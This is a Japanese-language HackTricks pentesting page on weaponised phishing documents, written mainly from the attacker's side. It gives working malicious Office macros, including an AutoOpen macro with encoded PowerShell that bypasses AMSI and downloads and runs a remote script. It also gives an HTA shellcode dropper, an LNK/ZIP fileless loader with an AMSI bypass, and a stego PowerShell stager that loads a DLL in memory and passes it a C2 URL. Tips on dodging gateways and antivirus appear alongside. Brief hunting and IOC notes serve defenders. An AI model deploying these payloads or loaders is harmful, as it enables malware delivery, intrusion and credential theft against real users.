# フィッシング ファイルとドキュメント

{{#include ../../banners/hacktricks-training.md}}

## Office ドキュメント

Microsoft Word はファイルを開く前にファイルのデータ検証を行います。データ検証は OfficeOpenXML 標準に基づくデータ構造の識別という形で行われます。データ構造の識別中にエラーが発生した場合、解析対象のファイルは開かれません。

通常、macros を含む Word ファイルは `.docm` 拡張子を使用します。しかし、ファイル拡張子を変更してファイル名を変更しても、その macro 実行機能を維持することは可能です。\
例えば、RTF ファイルは設計上 macros をサポートしませんが、DOCM ファイルを RTF にリネームすると Microsoft Word がそのファイルを扱い、macro を実行可能になります。\
同じ内部構造とメカニズムは Microsoft Office Suite (Excel, PowerPoint など) のすべてのソフトウェアに適用されます。

以下のコマンドを使用して、いくつかの Office プログラムで実行される拡張子を確認できます:
```bash
assoc | findstr /i "word excel powerp"
```
DOCXファイルがリモートテンプレートを参照している場合（File –Options –Add-ins –Manage: Templates –Go）で、テンプレートにマクロが含まれていると、マクロを“実行”することもあります。

### 外部画像の読み込み

次の操作を行ってください: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

ドキュメントから任意のコードを実行するためにmacrosを使用することが可能です。

#### Autoload functions

それらが一般的であるほど、AVによって検出される可能性が高くなります。

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### メタデータを手動で削除

**File > Info > Inspect Document > Inspect Document** に移動すると、Document Inspector が表示されます。**Inspect** をクリックし、次に **Document Properties and Personal Information** の横にある **Remove All** をクリックします。

#### Doc 拡張子

完了したら、**Save as type** のドロップダウンを選択し、形式を **`.docx`** から **Word 97-2003 `.doc`** に変更します。\
これは、**`.docx` の中に macro's を保存できない**ことと、macro-enabled の **`.docm`** 拡張子に対する**スティグマ**があるためです（例：サムネイルアイコンに大きな `!` が表示され、一部の web/email ゲートウェイが完全にブロックすることがあります）。したがって、この **legacy `.doc` extension が最良の妥協点**です。

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA ファイル

HTA は、HTML と VBScript や JScript のようなスクリプト言語を**組み合わせた**Windows プログラムです。ユーザーインターフェースを生成し、ブラウザのセキュリティモデルの制約を受けない「fully trusted」アプリケーションとして実行されます。

HTA は **`mshta.exe`** を使って実行され、通常は **Internet Explorer** と共に **installed** されます。これにより **`mshta` dependant on IE** となるため、Internet Explorer がアンインストールされていると HTA は実行できなくなります。
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM 認証の強制

いくつかの方法で**NTLM 認証を "remotely" で強制**できます。たとえば、ユーザがアクセスするメールや HTML に**不可視の画像**を追加する（HTTP MitM? を含む場合も）などです。また、被害者にフォルダを開くだけで**認証をトリガーする**ファイルの**アドレス**を送る、という手法もあります。

**以下のページでこれらのアイデアやその他を確認してください：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

ハッシュや認証を盗むだけでなく、**perform NTLM relay attacks**も実行できることを忘れないでください：

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

非常に効果的なキャンペーンでは、2つの正規のデコイ文書 (PDF/DOCX) と悪意ある .lnk を含む ZIP を配布します。トリックは、実際の PowerShell ローダーが ZIP の生バイト列の中で一意のマーカーの後に格納されており、.lnk がそれを切り出して完全にメモリ上で実行する点です。

以下は .lnk PowerShell one-liner によって実装される典型的なフローです:

1) Desktop, Downloads, Documents, %TEMP%, %ProgramData% およびカレントワークディレクトリの親ディレクトリなど、一般的なパスから元の ZIP を探す。  
2) ZIP のバイトを読み、一意にハードコードされたマーカー（例: xFIQCV）を見つける。マーカー以降のすべてが埋め込まれた PowerShell ペイロードとなる。  
3) ZIP を %ProgramData% にコピーし、そこで展開してデコイの .docx を開き正規に見せかける。  
4) 現在のプロセスで AMSI をバイパスする: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) 次のステージの難読化を解除（例: すべての # を除去）してメモリ上で実行する。

埋め込まれたステージを切り出して実行する PowerShell のスケルトン例:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- 配信ではしばしば信頼できる PaaS サブドメイン（例: *.herokuapp.com）を悪用し、ペイロードをゲートして（IP/UA に基づき無害な ZIP を返す）ことがある。
- 次段階では、ディスク上の痕跡を最小化するために base64/XOR shellcode を復号し、Reflection.Emit + VirtualAlloc 経由で実行することが多い。

Persistence used in the same chain
- Microsoft Web Browser コントロールの COM TypeLib hijacking により、IE/Explorer やそれを埋め込むアプリがペイロードを自動的に再実行する。詳細と即使えるコマンドは以下参照：

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- アーカイブデータに ASCII マーカー文字列（例: xFIQCV）が追記された ZIP ファイル。
- .lnk が親/ユーザフォルダを列挙して ZIP を探し、デコイ文書を開く。
- AMSI の改ざん（[System.Management.Automation.AmsiUtils]::amsiInitFailed を利用）。
- 信頼された PaaS ドメインにホストされたリンクで終わる長時間実行されるビジネススレッド。

## Steganography-delimited payloads in images (PowerShell stager)

最近のローダーチェーンでは、難読化された JavaScript/VBS を配布し、それが Base64 PowerShell stager をデコードして実行する。stager は画像（多くは GIF）をダウンロードし、ユニークな開始/終了マーカーの間にプレーンテキストとして隠された Base64-encoded .NET DLL を含む。スクリプトはこれらの区切りを検索し（実際に確認された例: «<<sudo_png>> … <<sudo_odt>>>»）、間のテキストを抽出して Base64 デコードしてバイト化し、アセンブリをメモリ上にロードして既知のエントリメソッドを C2 URL 付きで呼び出す。

Workflow
- Stage 1: Archived JS/VBS dropper → 埋め込まれた Base64 をデコード → PowerShell stager を -nop -w hidden -ep bypass で起動。
- Stage 2: PowerShell stager → 画像をダウンロードし、マーカー区切りの Base64 を切り出し、.NET DLL をメモリ上にロードしてそのメソッド（例: VAI）を C2 URL とオプションを渡して呼び出す。
- Stage 3: Loader は最終ペイロードを取得し、通常 process hollowing を使って信頼されたバイナリ（一般的には MSBuild.exe）に注入する。process hollowing と trusted utility proxy execution の詳細は以下参照：

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

注記
- This is ATT&CK T1027.003 (steganography/marker-hiding). マーカーはキャンペーンごとに異なります。
- AMSI/ETW bypass と string deobfuscation はアセンブリをロードする前によく適用されます。
- ハンティング: ダウンロードされた画像を既知のデリミタでスキャンする。PowerShell が画像にアクセスして即座に Base64 ブロブをデコードしているものを特定する。

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.

Skeleton logic (abstract):
- 自身のファイル内容を読み取る
- ジャンク文字列の間にある Base64 ブロブを見つける
- ASCII PowerShell にデコードする
- `wscript.exe`/`cscript.exe` から `powershell.exe` を呼び出して実行する

Hunting cues
- アーカイブされた JS/VBS 添付がコマンドラインで `-enc`/`FromBase64String` を使って `powershell.exe` を起動しているもの。
- ユーザーの temp パスから `wscript.exe` が `powershell.exe -nop -w hidden` を起動しているもの。

## Windows files to steal NTLM hashes

次のページ（**places to steal NTLM creds**）を確認してください：

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
